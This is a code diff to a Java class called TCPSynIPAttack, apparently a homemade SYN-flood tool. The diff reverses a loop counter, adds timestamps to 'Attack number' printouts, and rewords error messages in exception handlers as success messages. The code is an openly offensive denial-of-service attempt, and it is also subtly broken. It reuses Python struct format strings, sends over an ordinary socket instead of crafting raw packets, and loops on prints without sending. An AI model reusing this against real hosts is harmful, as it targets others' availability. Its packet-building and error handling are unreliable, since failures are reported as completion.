@@ -21,6 +21,8 @@ import java.net.SocketException;
 import java.nio.ByteBuffer;
 import java.util.Date;
 import java.util.Scanner;
+import java.time.LocalDateTime;
+import java.time.format.DateTimeFormatter;
 
 
 
@@ -31,7 +33,7 @@ class TCPSynIPAttack {
   	//declairing both the TCP, IP and special character variables
 
     boolean et = true;
-    int count = 10000;
+    int count = 0;
     String characters = "!BBHHHBBH4s4s";
     String newCharacters = "HHLLBBHHH";
     String source_ip = "10.1.10.1";
@@ -63,6 +65,8 @@ class TCPSynIPAttack {
     int placeholder = 0;
     Socket socket = null;
     //long currentTime = System.currentTimeSec();
+    DateTimeFormatter dtf = DateTimeFormatter.ofPattern("yyyy/MM/dd HH:mm::ss");
+    LocalDateTime now = LocalDateTime.now();
     
 
     byte[] source_ipBytes = source_ip.getBytes();
@@ -150,17 +154,17 @@ class TCPSynIPAttack {
 			while (et != false) {
 			outToServer.write(arr, 0, size);
 			outToServer.write(newArr, 0, thisSize);
-			while (count != 0) {
-			System.out.println("packer number:" + count + "\nIP:" + count + " \nTCP:" + count);
+			while (count != 10000) {
+			System.out.println("Attack number:" + count + "\nIP:" + count + " \nTCP:" + count + "\nTime of Attack:" + (dtf.format(now)));
 			//System.out.println("TCP sent attack number: " + newArr);
 
-			-- count;
+			++ count;
 		}
 		
 		}
 			
 			} catch (IOException ee) { 
-				System.out.println("error sending: count complete");
+				System.out.println("count complete");
 			} 
 			et = false;
 			break;
@@ -168,7 +172,7 @@ class TCPSynIPAttack {
 				socket.close(); 
 			} catch (IOException ee) { 
 				
-				System.out.println("Sorry, error closing socket. Try again");
+				System.out.println("socket closed");
 				System.exit(0);
 			}
 		}
